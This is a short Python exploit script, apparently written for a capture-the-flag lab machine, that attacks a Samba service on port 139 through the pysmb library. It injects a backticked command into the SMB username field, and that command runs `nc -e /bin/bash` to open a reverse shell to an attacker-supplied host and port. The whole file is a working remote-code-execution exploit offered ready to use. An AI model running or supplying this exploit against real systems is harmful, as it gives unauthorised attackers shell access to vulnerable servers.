#!/usr/bin/python3

# Before do pip3 install pysmb

from smb.SMBConnection import SMBConnection
import sys
import signal

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

def autopwn(lhost, lport):
    rhost = "10.10.10.3"
    rport = 139
    payload = "`nohup nc -e /bin/bash {} {} &`".format(lhost, lport)
    username = "/=" + payload
    conn = SMBConnection(username, "", "", "")
    try:
        conn.connect(rhost, int(rport), timeout=2)
    except:
        print("[+] check your netcat listener")

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[+] Usage: python3 {} <LHOST> <LPORT>".format(sys.argv[0]))
    else:
        print("[+] Connecting")
        lhost, lport = sys.argv[1:3]
        autopwn(lhost, lport)
